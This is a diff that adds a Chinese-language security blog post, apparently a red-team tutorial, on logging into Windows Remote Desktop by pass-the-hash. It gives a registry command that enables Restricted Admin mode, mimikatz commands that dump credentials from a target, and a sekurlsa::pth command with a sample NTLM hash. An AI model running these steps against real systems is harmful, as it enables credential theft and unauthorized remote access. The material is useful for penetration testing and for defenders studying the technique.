@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>利用hash登录远程桌面 - Lprvep</title><link rel="icon" type="image/png" href=icons/myicon.png /><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta property="og:title" content="利用hash登录远程桌面" />
+<meta property="og:description" content="在渗透测试过程中,获取得到了某个用户的NTLM hash时,可以利用PTH(Pass the hash)对远程桌面服务进行登录" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.lprvep.com/posts/pth-rdp/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-06-15T03:48:15&#43;08:00" />
+<meta property="article:modified_time" content="2021-06-15T03:48:15&#43;08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="利用hash登录远程桌面"/>
+<meta name="twitter:description" content="在渗透测试过程中,获取得到了某个用户的NTLM hash时,可以利用PTH(Pass the hash)对远程桌面服务进行登录"/>
+<link href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,300italic,400italic|Raleway:200,300" rel="stylesheet">
+
+	<link rel="stylesheet" type="text/css" media="screen" href="https://www.lprvep.com/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://www.lprvep.com/css/main.css" />
+	<link rel="stylesheet" type="text/css" href="https://www.lprvep.com/css/custom.css" />
+	<link rel="stylesheet" type="text/css" href="https://www.lprvep.com/css/dark.css" media="(prefers-color-scheme: dark)" />
+	<link rel="stylesheet" type="text/css" href="https://www.lprvep.com/css/custom-dark.css" media="(prefers-color-scheme: dark)" />
+
+	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+	<script src="https://www.lprvep.com/js/main.js"></script>
+	<script src="https://www.lprvep.com/js/abc.js"></script>
+	<script src="https://www.lprvep.com/js/xyz.js"></script>
+	<script src="https://code.jquery.com/jquery-3.4.1.js"></script>
+</head>
+
+<body>
+	<div class="container wrapper post">
+		<div class="header">
+	<base href="https://www.lprvep.com/">
+	<h1 class="site-title"><a href="https://www.lprvep.com/">Lprvep</a></h1>
+	<div class="site-description"><h2>Web Security</h2><nav class="nav social">
+			<ul class="flat"><a href="https://github.com/godbless7" title="Github"><i data-feather="github"></i></a><a href="https://twitter.com/lprvep" title="Twitter"><i data-feather="twitter"></i></a><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></ul>
+		</nav>
+	</div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">All posts</a>
+			</li>
+			
+			<li>
+				<a href="/read">Read</a>
+			</li>
+			
+			<li>
+				<a href="/about">About</a>
+			</li>
+			
+			<li>
+				<a href="/tags">Tags</a>
+			</li>
+			
+			<li>
+				<a href="/avlist">Avlist</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post-header">
+			<h1 class="title">利用hash登录远程桌面</h1>
+			<div class="meta">Posted at &mdash; Jun 15, 2021</div>
+		</div>
+
+		<div class="markdown">
+			<p>在渗透测试过程中,获取得到了某个用户的NTLM hash时,可以利用PTH(Pass the hash)对远程桌面服务进行登录</p>
+<h5 id="适用系统">适用系统</h5>
+<p>Windows8.1和 Windows Server 2012 R2默认支持该功能</p>
+<p>Windows7 和 Windows Server 2008 R2默认不支持,需要安装补丁KB2871997,KB2973351</p>
+<p>Server 开启Restricted Admin mode时，Client 也需要支持Restricted Admin mode</p>
+<h5 id="查询与开启restricted-admin-mode受限管理模式">查询与开启Restricted Admin mode(受限管理模式)</h5>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">REG query <span style="color:#2aa198">&#34;HKLM\System\CurrentControlSet\Control\Lsa&#34;</span> | findstr <span style="color:#2aa198">&#34;DisableRestrictedAdmin&#34;</span>  //查询
+
+REG ADD <span style="color:#2aa198">&#34;HKLM\System\CurrentControlSet\Control\Lsa&#34;</span> /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f //开启
+</code></pre></div><p>关闭状态</p>
+<p><img src="../images/pth-rdp/image-20210606035504084.png" alt="image-20210606035504084"></p>
+<p>开启状态</p>
+<p><img src="../images/pth-rdp/image-20210606052446319.png" alt="image-20210606052446319"></p>
+<h5 id="操作过程">操作过程</h5>
+<p>开启Restricted Admin mode后</p>
+<p>在目标机上,使用mimikatz获取hash</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">privilege::debug
+sekurlsa::logonpasswords
+</code></pre></div><p>然后回到本机使用mimikata来进行pth传递</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">privilege::debug
+sekurlsa::pth /user:administrator /domain:remoteserver /ntlm:4d2c5c458c59cb2b15dc7d00d0a59fb3 <span style="color:#2aa198">&#34;/run:mstsc.exe /restrictedadmin&#34;</span>
+</code></pre></div><p>输入以上命令后,会弹远程桌面连接框,更改为目标ip,点击连接</p>
+<p><img src="../images/pth-rdp/image-20210606052159397.png" alt="image-20210606052159397"></p>
+<p>若未开启Restricted Admin mode则会出现以下提示</p>
+<p><img src="../images/pth-rdp/image-20210606052302516.png" alt="image-20210606052302516"></p>
+<p>若已开启Restricted Admin mode,则会直接进入到远程桌面不需要密码</p>
+<p><img src="../images/pth-rdp/image-20210606052535190.png" alt="image-20210606052535190"></p>
+<h5 id="参考">参考</h5>
+<p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Pass-the-Hash-with-Remote-Desktop(Restricted-Admin-mode)">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Pass-the-Hash-with-Remote-Desktop(Restricted-Admin-mode)</a></p>
+<p><a href="https://xz.aliyun.com/t/8574#toc-2">https://xz.aliyun.com/t/8574#toc-2</a></p>
+
+		</div>
+
+		<div class="post-tags">
+			
+				
+					<nav class="nav tags">
+							<ul class="flat">
+								
+								<li><a href="/tags/redteam">redteam</a></li>
+								
+							</ul>
+					</nav>
+				
+			
+		</div>
+		</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div> © Copyright notice |  <a href="https://github.com/godbless7">lprvep</a></div>
+	</nav>
+</div>
+
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-123-45', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+<script>feather.replace()</script>
+</body>
+</html>
